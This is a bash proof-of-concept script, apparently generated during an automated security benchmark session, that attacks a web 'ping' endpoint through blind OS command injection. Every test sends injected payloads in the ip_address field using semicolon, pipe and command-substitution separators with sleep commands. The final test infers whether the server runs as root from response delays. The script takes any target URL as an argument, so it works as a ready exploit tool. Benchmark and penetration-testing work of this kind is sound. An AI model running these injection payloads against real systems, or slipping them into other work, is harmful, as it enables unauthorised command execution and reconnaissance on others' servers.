#!/bin/bash
# POC: Demonstrates blind OS command injection via time-based detection using sleep command to measure response delays and confirm command execution without output reflection
# Target: ./repo
# Created: 2025-11-10T15:06:24.552Z
# Session: benchmark-XBEN-037-24-mht9nqa0

# Blind OS Command Injection via Time-Based Detection POC
# This script demonstrates how attackers can exploit command injection
# in scenarios where command output is not reflected in the response
# by using timing channels (sleep command) to confirm execution

TARGET_URL="${1:-http://localhost:5000/ping}"
TIMEOUT=15

echo "=================================================="
echo "Blind OS Command Injection - Timing Detection POC"
echo "=================================================="
echo "Target: $TARGET_URL"
echo ""

# Test 1: Baseline request (no injection)
echo "[*] Test 1: Baseline request (no injection)"
echo "    Payload: 127.0.0.1"
START=$(date +%s%N)
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "ip_address=127.0.0.1" \
  --max-time $TIMEOUT 2>/dev/null)
END=$(date +%s%N)
BASELINE_TIME=$(( (END - START) / 1000000 ))
echo "    Response time: ${BASELINE_TIME}ms"
echo "    Response: $RESPONSE"
echo ""

# Test 2: Semicolon + sleep 5
echo "[*] Test 2: Command injection with sleep 5 (semicolon separator)"
echo "    Payload: 127.0.0.1;sleep 5"
START=$(date +%s%N)
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "ip_address=127.0.0.1;sleep 5" \
  --max-time $TIMEOUT 2>/dev/null)
END=$(date +%s%N)
SLEEP5_TIME=$(( (END - START) / 1000000 ))
echo "    Response time: ${SLEEP5_TIME}ms"
echo "    Response: $RESPONSE"
DELAY=$((SLEEP5_TIME - BASELINE_TIME))
if [ $DELAY -ge 4500 ]; then
    echo "    ✓ VULNERABLE: 5-second delay detected (~${DELAY}ms)"
else
    echo "    ✗ Not exploitable with this method"
fi
echo ""

# Test 3: Pipe + sleep 3
echo "[*] Test 3: Command injection with sleep 3 (pipe separator)"
echo "    Payload: 127.0.0.1|sleep 3"
START=$(date +%s%N)
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "ip_address=127.0.0.1|sleep 3" \
  --max-time $TIMEOUT 2>/dev/null)
END=$(date +%s%N)
SLEEP3_TIME=$(( (END - START) / 1000000 ))
echo "    Response time: ${SLEEP3_TIME}ms"
echo "    Response: $RESPONSE"
DELAY=$((SLEEP3_TIME - BASELINE_TIME))
if [ $DELAY -ge 2500 ]; then
    echo "    ✓ VULNERABLE: 3-second delay detected (~${DELAY}ms)"
else
    echo "    ✗ Not exploitable with this method"
fi
echo ""

# Test 4: Command substitution + sleep 2
echo "[*] Test 4: Command injection with sleep 2 (command substitution)"
echo "    Payload: 127.0.0.1\$(sleep 2)"
START=$(date +%s%N)
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "ip_address=127.0.0.1\$(sleep 2)" \
  --max-time $TIMEOUT 2>/dev/null)
END=$(date +%s%N)
SLEEP2_TIME=$(( (END - START) / 1000000 ))
echo "    Response time: ${SLEEP2_TIME}ms"
echo "    Response: $RESPONSE"
DELAY=$((SLEEP2_TIME - BASELINE_TIME))
if [ $DELAY -ge 1500 ]; then
    echo "    ✓ VULNERABLE: 2-second delay detected (~${DELAY}ms)"
else
    echo "    ✗ Not exploitable with this method"
fi
echo ""

# Test 5: Conditional time-based information leakage
echo "[*] Test 5: Conditional time-based information leakage"
echo "    Payload: 127.0.0.1;[[ \$(id | grep root) ]] && sleep 5"
echo "    Testing if current user is root based on response time..."
START=$(date +%s%N)
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "ip_address=127.0.0.1;[[ \$(id | grep root) ]] && sleep 5" \
  --max-time $TIMEOUT 2>/dev/null)
END=$(date +%s%N)
COND_TIME=$(( (END - START) / 1000000 ))
echo "    Response time: ${COND_TIME}ms"
echo "    Response: $RESPONSE"
if [ $COND_TIME -ge 4500 ]; then
    echo "    ✓ Inference: Current user IS root (5+ second delay)"
else
    echo "    ℹ Inference: Current user is NOT root (<1 second response)"
fi
echo ""

echo "=================================================="
echo "POC Execution Complete"
echo "=================================================="
echo ""
echo "Summary:"
echo "  - Baseline response time: ${BASELINE_TIME}ms"
echo "  - If you see consistent delays matching the sleep values,"
echo "    the application is vulnerable to timing-based blind injection"
echo ""